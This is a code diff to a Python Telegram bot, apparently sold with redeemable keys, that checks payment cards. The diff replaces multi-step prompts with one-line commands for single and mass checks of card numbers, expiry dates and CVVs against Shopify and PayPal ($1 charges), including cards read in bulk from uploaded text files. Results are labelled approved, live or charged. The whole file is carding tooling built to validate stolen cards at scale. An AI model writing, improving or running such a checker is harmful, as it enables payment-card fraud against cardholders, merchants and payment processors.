@@ -14,7 +14,6 @@ from aiogram import Bot, Dispatcher, Router, F
 from aiogram.types import Message
 from aiogram.filters import Command, CommandObject
 from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
 from aiogram.enums import ParseMode
 from aiogram.client.default import DefaultBotProperties
 
@@ -102,18 +101,10 @@ async def get_bin_info(session, cc):
     except: pass
     return "Unknown", "Unknown", "Unknown", "", "Unknown"
 
-# --- FSM STATES ---
-class AppStates(StatesGroup):
-    waiting_shopify_single = State()
-    waiting_shopify_mass = State()
-    waiting_paypal_single = State()
-    waiting_paypal_mass = State()
-
-# --- RESULT UI FORMATTER (BEAUTIFUL VERSION) ---
+# --- RESULT UI FORMATTER ---
 def format_result(status, checker, result, cc, country, flag, bank, brand, c_type, total, app, dec, err, start_time, tier, username):
     elapsed = time.time() - start_time
     
-    # Premium Header Selection
     if status in ["APPROVED", "LIVE"]:
         header = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
     elif status == "CHARGED":
@@ -163,12 +154,10 @@ async def cmd_start(message: Message, state: FSMContext):
             "👋 <b>Welcome to the Checker Bot</b>\n\n"
             "📌 <b>Available Commands:</b>\n\n"
             "💳 <b>Checkers:</b>\n"
-            "• /paypal_mass → Mass PayPal check\n"
-            "• /paypal_mass_file → Mass PayPal (TXT File)\n"
-            "• /paypal_single → Single PayPal check\n"
-            "• /shopify_mass → Mass Shopify check\n"
-            "• /shopify_mass_file → Mass Shopify (TXT File)\n"
-            "• /shopify_single → Single Shopify check\n\n"
+            "• /mpp → Mass PayPal check\n"
+            "• /pp → Single PayPal check\n"
+            "• /msh → Mass Shopify check\n"
+            "• /sh → Single Shopify check\n\n"
             "🔑 <b>Keys:</b>\n"
             "• /redeem → Redeem a key\n\n"
             "⚙️ <b>Other:</b>\n"
@@ -331,7 +320,6 @@ async def process_checker(message: Message, text: str, checker: str):
                     success, raw, g_name, p, c = await process_card_async(cc_clean, mes, ano, cvv, "https://shop.spam.com")
                     resp = extract_clean_response(raw)
                     
-                    # --- BUG FIX: Read the text, not just the boolean ---
                     resp_upper = resp.upper()
                     if any(x in resp_upper for x in ["CHARGED", "ORDER_PLACED", "THANK YOU"]):
                         status = "CHARGED"
@@ -371,67 +359,63 @@ async def process_checker(message: Message, text: str, checker: str):
                 except: pass
             await asyncio.sleep(0.5)
 
-# --- COMMAND ROUTERS (ENTRY POINTS) ---
-@router.message(Command("shopify_single"))
-async def start_shopify_single(message: Message, state: FSMContext):
+# --- ONE-LINE COMMAND ROUTERS ---
+@router.message(Command("sh"))
+async def cmd_sh(message: Message, command: CommandObject, state: FSMContext):
     await state.clear()
-    await message.answer("🟢 Send the card to check (CC|MM|YYYY|CVV):")
-    await state.set_state(AppStates.waiting_shopify_single)
+    if not command.args:
+        return await message.answer("⚠️ <b>Usage:</b> <code>/sh CC|MM|YYYY|CVV</code>")
+    await process_checker(message, command.args, "Shopify Single")
 
-@router.message(Command("shopify_mass"))
-@router.message(Command("shopify_mass_file"))
-async def start_shopify_mass(message: Message, state: FSMContext):
+@router.message(Command("pp"))
+async def cmd_pp(message: Message, command: CommandObject, state: FSMContext):
     await state.clear()
-    await message.answer("🟢 Send your list of cards (Text or .txt File) for Mass Check:")
-    await state.set_state(AppStates.waiting_shopify_mass)
+    if not command.args:
+        return await message.answer("⚠️ <b>Usage:</b> <code>/pp CC|MM|YYYY|CVV</code>")
+    await process_checker(message, command.args, "PayPal Single ($1)")
 
-@router.message(Command("paypal_single"))
-async def start_paypal_single(message: Message, state: FSMContext):
+@router.message(Command("msh"))
+async def cmd_msh(message: Message, command: CommandObject, state: FSMContext):
     await state.clear()
-    await message.answer("🔵 Send the card to check (CC|MM|YYYY|CVV):")
-    await state.set_state(AppStates.waiting_paypal_single)
-
-@router.message(Command("paypal_mass"))
-@router.message(Command("paypal_mass_file"))
-async def start_paypal_mass(message: Message, state: FSMContext):
-    await state.clear()
-    await message.answer("🔵 Send your list of cards (Text or .txt File) for Mass Check:")
-    await state.set_state(AppStates.waiting_paypal_mass)
-
-# --- FSM PROCESSORS ---
-@router.message(AppStates.waiting_shopify_single)
-async def exe_shopify_single(message: Message, state: FSMContext):
-    await state.clear()
-    await process_checker(message, message.text, "Shopify Single")
-
-@router.message(AppStates.waiting_shopify_mass)
-async def exe_shopify_mass(message: Message, state: FSMContext):
-    await state.clear()
-    text = message.text
-    if message.document:
+    text = command.args or ""
+    
+    # Check if they replied to a txt file or sent a file with the command as caption
+    if message.reply_to_message and message.reply_to_message.document:
+        file = await bot.get_file(message.reply_to_message.document.file_id)
+        result = await bot.download_file(file.file_path)
+        text += "\n" + result.read().decode('utf-8')
+    elif message.document:
         file = await bot.get_file(message.document.file_id)
         result = await bot.download_file(file.file_path)
-        text = result.read().decode('utf-8')
+        text += "\n" + result.read().decode('utf-8')
+        
+    if not text.strip():
+        return await message.answer("⚠️ <b>Usage:</b> <code>/msh CC|MM...</code> or reply to a .txt file.")
+        
     await process_checker(message, text, "Shopify Mass")
 
-@router.message(AppStates.waiting_paypal_single)
-async def exe_paypal_single(message: Message, state: FSMContext):
+@router.message(Command("mpp"))
+async def cmd_mpp(message: Message, command: CommandObject, state: FSMContext):
     await state.clear()
-    await process_checker(message, message.text, "PayPal Single ($1)")
-
-@router.message(AppStates.waiting_paypal_mass)
-async def exe_paypal_mass(message: Message, state: FSMContext):
-    await state.clear()
-    text = message.text
-    if message.document:
+    text = command.args or ""
+    
+    if message.reply_to_message and message.reply_to_message.document:
+        file = await bot.get_file(message.reply_to_message.document.file_id)
+        result = await bot.download_file(file.file_path)
+        text += "\n" + result.read().decode('utf-8')
+    elif message.document:
         file = await bot.get_file(message.document.file_id)
         result = await bot.download_file(file.file_path)
-        text = result.read().decode('utf-8')
+        text += "\n" + result.read().decode('utf-8')
+        
+    if not text.strip():
+        return await message.answer("⚠️ <b>Usage:</b> <code>/mpp CC|MM...</code> or reply to a .txt file.")
+        
     await process_checker(message, text, "PayPal Mass ($1)")
 
 # --- MAIN DEPLOYMENT ---
 async def main():
-    print("BEAR OS PRO DEPLOYED - PREMIUM UI ACTIVE")
+    print("BEAR OS PRO DEPLOYED - ONE-LINE COMMANDS ACTIVE")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
